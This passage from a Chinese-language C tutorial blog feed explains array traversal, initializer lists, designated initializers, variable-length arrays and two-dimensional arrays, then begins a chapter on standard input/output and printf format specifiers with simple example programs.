class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//定义长度为10的int数组来存1~10这10个数</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        a[i] = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]); <span class="comment">// 获取数组中的每一个值</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024141939496.png" alt="image-20231024141939496" style="zoom:50%;" /><p>上面这种使用循环变量对数组进行逐个的访问的方法叫做<code>遍历</code>,顾名思义,就是一个一个有序地对数组这个序列进行访问,我们可以在遍历时仅仅获取它们的值,或者可以对它们进行修改.</p><h2 id="对数组进行初始化">对数组进行初始化</h2><p>在上一节的例子中,我们使用循环对数组的每一个元素进行了赋值.</p><p>我们也可以在声明时就使用一些特定的值对数组进行<code>初始化</code>,这里涉及到<code>初始化器</code>这个概念,具体可以自行百度了解.</p><h3 id="初始化列表">初始化列表</h3><p>我们在声明时对数组的各个元素进行初始化,可以使用<code>初始化列表</code>来实现,语法如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;元素类型&gt; &lt;数组名&gt;[数组长度] = &#123;表达式,...&#125;;</span><br></pre></td></tr></table></figure><p>可以看到,除了原先的声明,我们在<code>[]</code>后面紧跟一个<code>=&#123;&#125;</code>,其中包含有若干以<code>,</code>分隔的表达式,这些表达式的值用于对数组的每个元素依次进行赋值.</p><p>例如,我们上面的例子可以改写为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//定义长度为10的int数组来存1~10这10个数</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果不变.</p><p>注意:</p><ol><li><p><code>&#123;&#125;初始化列表</code>中的表达式个数不能多于数组元素的个数(数组长度),它们是一一对应来赋值的</p></li><li><p>如果表达式个数少于数组元素的个数,则后面的值被填充为整型的0或浮点型的+0</p><p>需要注意的是,自C23起,C语言才支持了使用<code>=&#123;&#125;</code>这样的<code>空初始化器</code>来达成与 C++ 中的<a href="https://zh.cppreference.com/w/cpp/language/value_initialization">值初始化</a>相同的语义</p></li><li><p>特别常用于int数组,我们可以使用<code>=&#123;0&#125;</code>来用0填充整个数组,不过,对于浮点型,个人建议还是不要依赖这种填充</p></li><li><p>如果没有对数组进行初始化,那么数组的各个元素将会是垃圾值,我们必须对其赋初值后才能&quot;使用&quot;它们.</p><p>注意:放在全局变量的数组和普通变量一样,会用0去填充,而不是垃圾值</p></li></ol><h3 id="指定初始化器">指定初始化器</h3><p>C99新增了一个<code>指定初始化器</code>的特性,这让我们可以初始化指定的数组元素:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//C99新增了一个`指定初始化器`的特性,这让我们可以初始化指定的数组元素</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;[<span class="number">2</span>] = <span class="number">1</span>, [<span class="number">5</span>] = <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, [<span class="number">9</span>] = <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="comment">// 等价于</span></span><br><span class="line">    <span class="comment">// int a[10] = &#123;0&#125;;</span></span><br><span class="line">    <span class="comment">// a[2] = 1;</span></span><br><span class="line">    <span class="comment">// a[5] = 2;</span></span><br><span class="line">    <span class="comment">// a[9] = 3;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024160309066.png" alt="image-20231024160309066" style="zoom:50%;" /><p>对于一般的初始化,在初始化一个元素后,未初始化的元素都会被设置为0.</p><p>并且需要注意上面的例子中,[5]之后的6,7继续顺延到对[6],[7]进行赋值.</p><h2 id="未知大小数组">未知大小数组</h2><p>如果我们忽略数组长度,那么这就是一个不完整的类型.关于这个问题不好解释,可以去找标准参阅.</p><p>如果我们这样写,我们需要使用初始化列表来进行初始化,以便编译器确定数组的长度,否则,编译器会因无法得知数组的大小而无法分配空间,导致报错.</p><p><code>初始化列表</code>中表达式的个数就会成为数组长度,另一方面,如果使用了<code>指定初始化器</code>,则会保证数组能够容纳下所有的元素,例如有<code>=&#123;[5]=3&#125;</code>,则数组的长度为6,刚好能容纳下元素[5].</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组a的长度为10.</p><h2 id="字符数组的初始化">字符数组的初始化</h2><p>字符数组的初始化有个特例,我们不仅可以像这样正常的为字符数组进行逐个赋值:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 字符数组的初始化有个特例,我们不仅可以像这样正常的为字符数组进行逐个赋值:</span></span><br><span class="line">    <span class="type">char</span> a[<span class="number">100</span>]=&#123;<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;d&#x27;</span>&#125;;</span><br><span class="line">    <span class="comment">// char a[100]=&quot;hello world&quot;;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024161013244.png" alt="image-20231024161013244" style="zoom:50%;" /><p>我们还可以直接使用一个字符串常量对其进行赋值:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 字符数组的初始化有个特例,我们不仅可以像这样正常的为字符数组进行逐个赋值:</span></span><br><span class="line">    <span class="type">char</span> a[<span class="number">100</span>]=<span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024161013244.png" alt="image-20231024161013244" style="zoom:50%;" /><p>效果是一样的,因为逐个赋值依旧是初始化列表,后面的<code>'\0'</code>字符串结束标志,也就是整数0同样被默认填充.</p><p>而使用字符串常量,进行的是复制操作,结尾的<code>'\0'</code>同样会被添加.</p><p>关于这方面的内容,后面讲解字符串时会进行详细讨论.</p><h2 id="非常量长度数组">非常量长度数组</h2><p>必须首先强调的是,<code>非常量长度数组</code>,或者叫<code>变长数组</code>,再或者缩写为<code>VLA</code>,目前的兼容性不好,例如VS默认的msvc编译器就不支持这种用法.</p><p>另外<code>VLA</code>是在C99引入的.</p><p>简单的说就是可以使用变量来声明数组,不是很建议使用,这里仅给出一个简单的例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n); <span class="comment">// 输入10</span></span><br><span class="line">    <span class="type">int</span> a[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">        a[i] = i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024162521152.png" alt="image-20231024162521152" style="zoom:50%;" /><h1 id="二维数组">二维数组</h1><p>二维数组实际上,就是&quot;数组的数组&quot;,即一个数组的每个元素都是数组.读者自行想象,最终结果就是实现一个NxM的矩阵.</p><p>有些问题光有一维(线性)的数组是不够的,我们需要&quot;二维的&quot;空间来存储,例如一张迷宫的地图.此时,就需要所谓的二维数组.</p><p>必须指出的是,所谓的二维,包括可能用到的更多维数组,都是逻辑上的划分,实际上数组全部都是线性的,也就是说,它们仍然在内存上排成一列,只不过是把这一长串的内存划分成几个大块,每一块都是一个子数组,作为整个数组的一个元素来使用.</p><h2 id="二维数组的声明">二维数组的声明</h2><p>我们十分容易能够将一维推广到二维:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>];</span><br></pre></td></tr></table></figure><p>这将声明一个&quot;3行4列&quot;的二维数组,类似这样:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024163941327.png" alt="image-20231024163941327" style="zoom:50%;" /><p>事实上,在底层,它仍然是一段连续的内存单元,也就是长为3x4xsizeof(int),也就是3x4x4=48个字节的连续内存:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024164414243.png" alt="image-20231024164414243" style="zoom:50%;" /><p>只不过我们从逻辑上将其转换为一个相对&quot;立体&quot;的矩阵而已,底层上,仍然是线性存储的.</p><p>所以有一句话:“C语言没有二维数组”,这句话就是针对C的底层逻辑来描述的,当然,这不影响我们简单地将其视为二维来解释,事实上,既然C能够有这种写法,当然就是为了满足我们对多维数组的需求.</p><p>关于这方面的详细内容,我们将会在学习指针之后展开详细讨论(注:这是难点)</p><p>回到声明,我们可以看到,第一个[]代表第一维(可以理解为行),第二个[]代表第二维(可以理解为列),<code>int a[3][4]</code>就声明了一个3行4列的二维数组.</p><p>对其访问也十分简单,例如我们要访问第2行第3列的元素,其下标为<code>[1][2]</code>—下标仍然从0开始</p><p>则该元素就是<code>a[1][2]</code></p><h2 id="二维数组的初始化">二维数组的初始化</h2><p>对于初始化列表,同样可以应用于二维数组,我们既可以直接用一个花括号初始化所有的元素:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;;</span><br></pre></td></tr></table></figure><p>我们还可以进行嵌套,这样更加直观,可以很容易地看出我们正在初始化的是哪一行:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">            &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;,</span><br><span class="line">            &#123;<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;,</span><br><span class="line">            &#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>这两种写法等价,不过建议使用第二种方法,更为清晰.</p><p>例如我们可以输出1,2,3,4,…,12这些数组成的3x4的矩阵:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">            &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;,</span><br><span class="line">            &#123;<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;,</span><br><span class="line">            &#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i][j]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024165611507.png" alt="image-20231024165611507" style="zoom:50%;" /><p>至于多维数组,均同理:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>][<span class="number">5</span>]; <span class="comment">// 声明一个三维数组</span></span><br></pre></td></tr></table></figure><p>但是一般用的比较少,大多数情况下,二维数组就已经能满足各种需求了.</p><br><p>本章简单讲解了数组的使用方法,至于更加深入的内容,在没有讲解指针之前,都无法特别清楚的进行讨论.</p><p align=right>---WAHAHA</p><br><br><p>上一篇:<a href="../2023a60ec9bcedd8">C语言教程-9-运算符及其优先级和求值顺序</a></p><p>下一篇:<a href="../2023b45ef26d6ec3">C语言教程-11-字符串</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-3_2-基本输入输出</title>
      <link href="/2023427f4611cc41/"/>
      <url>/2023427f4611cc41/</url>
      
        <content type="html"><![CDATA[<h1 id="理解输入输出">理解输入输出</h1><h2 id="什么是交互">什么是交互</h2><p>程序是为人服务的,程序计算出来的所有数据,最终都以各种不同的方式来间接或直接地提供给我们,也就是<code>输出</code>.</p><p>同样,程序在运行时,我们往往也需要为其提供一些必要的数据,作为<code>输入</code>.</p><p>程序根据我们输入的信息来进行处理,并将结果显示出来.</p><p>最基本的输入输出操作,就是在控制台屏幕使用键盘进行交互,我们将需要输入的数据使用<code>键盘</code>来输入,程序将需要输出的数据显示在<code>屏幕</code>上.这种输入输出叫做<code>标准输入输出</code>.</p><p>在<code>标准输入输出</code>中,往往使用<code>电脑显示器</code>来作为标准输出的目标,使用<code>键盘</code>来作为标准输入的来源.</p><p>本章我们要讲的就是<code>标准输入输出</code>,也就是<code>Standard input/output</code>.即简单地使用键盘输入,从屏幕上看到输出信息.</p><h2 id="什么是流">什么是流</h2><p>许多资料都会引入<code>流</code>这个概念,输入输出也是一种流.</p><p><code>流(Stream)</code>是一个抽象的概念,表示数据从一个地方流向另一个地方，或者数据从一个源生成，并最终被传递到目的地。流可以是字节流（以字节为单位处理数据）或字符流（以字符为单位处理数据).</p><p>我们之前存储的数据全部是固定存储在某个地方,我们直接通过地址等方式进行引用即可找到,但是流数据不同.</p><p>可以将存储的数据类比为水池中的水,流数据类比为水流.存储的数据是<code>相对固定的</code>,我们可以反复进行存取,例如电脑中存储的一张照片,一段视频;而流数据往往代表的是某个数据源<code>即时生成的</code>数据,直接依次传输到目的地,例如键盘读取的一系列敲击操作.</p><p>标准输入输出就是这样的一类流.</p><p>在进行<code>标准输入</code>时,也即从键盘进行读取,键盘就是一个<code>标准输入流设备</code>,从键盘读入的数据不需要进行<code>缓冲</code>,直接逐个进行传输即可,就像<code>水流</code>一样.</p><p>同理,在进行<code>标准输出</code>是,也即向屏幕显示,也是将其视为数据流来&quot;流&quot;向屏幕(实际上是终端),并逐个打印到屏幕上.</p><p>或者,读者可能知道<code>&quot;流媒体&quot;</code>这个概念.与键盘这样的<code>流设备</code>对应的,还有<code>块设备</code>,例如硬盘,它们需要一个成块的空间来进行<code>缓冲</code>,数据的读取是成块成块的.</p><p>关于<code>流</code>的简单讲解就这么多,我们只需要知道,本章讲解的就是对标准输入输出流进行操作.</p><h1 id="c语言对标准输入输出的支持">C语言对标准输入输出的支持</h1><h2 id="stdio-h">stdio.h</h2><p>我们前面看到很多程序的开头都有<code>#include &lt;stdio.h&gt;</code>这行指令,但是并没有深究其作用,实际上,它就是为我们的程序提供了标准输入输出的支持.</p><p><code>#include预处理指令</code>用于引入头文件,这里引入的就是C标准库的<code>stdio.h</code>头文件,这个头文件中定义,声明了有关输入输出的各种内容.想必各位可能已经意识到,<code>stdio</code>,即<code>standard in/out</code>的缩写.</p><p>当然,C可以支持的输出输出不仅仅有标准IO(即标准输入输出,以下均简写为标准IO),还有文件IO,网络IO,内存IO等等,它们往往更加复杂,需要更多的处理,但是殊途同归,它们都是数据操作,并且往往都是视为流去处理.</p><p>在stdio.h中有许多函数声明,和一些常用的宏,下面进行简单列举:</p><h2 id="输入输出函数">输入输出函数</h2><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>scanf()函数</td><td>用于格式化输入</td></tr><tr><td>printf()函数</td><td>用于格式化输出</td></tr><tr><td>puts()函数</td><td>用于输出字符串,并自动加上换行符</td></tr><tr><td>gets()函数</td><td>输入一个字符串,同时会接受除了<code>'\n'</code>的其他空白字符.(由于有严重的安全缺陷已弃用)</td></tr><tr><td>putchar()函数</td><td>输出单个字符</td></tr><tr><td>getchar()函数</td><td>输入单个字符</td></tr></tbody></table><h2 id="三个流">三个流</h2><table><thead><tr><th>预定义</th><th>关联</th></tr></thead><tbody><tr><td>#define stdin  /* implementation-defined */</td><td>标准输入流</td></tr><tr><td>#define stdout /* implementation-defined */</td><td>标准输出流</td></tr><tr><td>#define stderr /* implementation-defined */</td><td>标准错误流</td></tr></tbody></table><p>这些宏展开成 <a href="http://zh.cppreference.com/w/c/io">FILE</a>* 类型表达式(即它们是文件指针)</p><h1 id="常用函数讲解">常用函数讲解</h1><h2 id="c风格字符串">C风格字符串</h2><p>这里简单讲解一下字符串:</p><p>C语言中,字符串是由一对<code>&quot;&quot;</code>和其包括起来的任意数量的字符组成.</p><p>例如,我们想要表示<code>Hello world!</code>这行字符串,就是这么写:</p><p><code>&quot;Hello world!&quot;</code></p><p>任何可以放到char变量中的字符,都可以出现在字符串中.</p><h2 id="printf-函数">printf()函数</h2><h3 id="基本用法">基本用法</h3><p>函数原型如下:</p><p><code>int printf( const char *restrict format, ... );</code></p><p>printf函数名实际就是print formatted的缩写,意即打印格式化的字符串.</p><p>可以看到printf函数的第一个参数是一个字符串,后面可以继续接任意个数的其他参数(函数参数的内容将在后面讲解函数时详细展开).</p><p>函数的返回值为最终打印的字符个数.</p><p>printf()函数用于根据我们的格式要求生成一个最终的字符串,来打印到我们的终端(输出),这个字符串可以由多个字符串,多个整数,多个字符,多个浮点数等等拼接而成.</p><p>参数的第一个字符串就是用于描述这些数据如何进行拼装的,也即所谓的格式化字符串,用于描述输出格式.</p><p>我们说的各个数据就是后面可以追加的若干任意数量的参数,它们可以是任意数据类型的值.</p><p>printf函数的最基本用法就是输出一个字符串常量:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 此代码中格式化字符串中没有任何格式字符,仅仅是输出了一个普通的字符串</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是printf函数的强大是体现在这个格式化字符串的,这个字符串中可以加入一些指定好的<code>格式指示符</code>,来进行额外的格式化操作,举一个简单的例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="type">int</span> i = <span class="number">123</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello%5d!&quot;</span>,i);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018151927825.png" alt="image-20231018151927825" style="zoom: 50%;" /><p>可以看到123前面有2个空格,<code>&quot;  123&quot;</code>一共占用5个字符的宽度,即格式化字符串中的%5d用于将后面的第一个整型参数i输出,并保证至少占用5位的宽度,并插入到其他的<code>&quot;Hello&quot;</code>和<code>&quot;!&quot;</code>中间,最终生成<code>&quot;Hello  123!&quot;</code>这个字符串打印到终端.</p><p>这里<code>%5d</code>就是一种<code>格式指示符</code>,与此类似的<code>格式指示符</code>还有很多,我们列举一些常用的.</p><h3 id="格式指示符">格式指示符</h3><p>这里引用了《C Primer Plus (第6版)》的内容:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018154428429.png" alt="image-20231018154428429"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018154451517.png" alt="image-20231018154451517"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018154512241.png" alt="image-20231018154512241"></p><p>读者请自行理解试验,需要用到哪种控制符可以去查找表格学习用法.</p><h3 id="注意">注意</h3><p>1.对于浮点数,为了安全起见,printf函数将所有float类型的参数都提升为double类型(对未使用显式类型原型的所有C函数都有效).</p><p>2.如果格式化字符串较长,可以在一行结尾加上<code>\</code>来转义换行符(下一行必须从最开始开始,否则缩进就会变成字符串的一部分),或者使用两个字符串进行拼接:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="type">int</span> sum = <span class="number">123</span>;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Hello \</span></span><br><span class="line"><span class="string">World!\n&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span></span><br><span class="line">            <span class="string">&quot;World!&quot;</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img 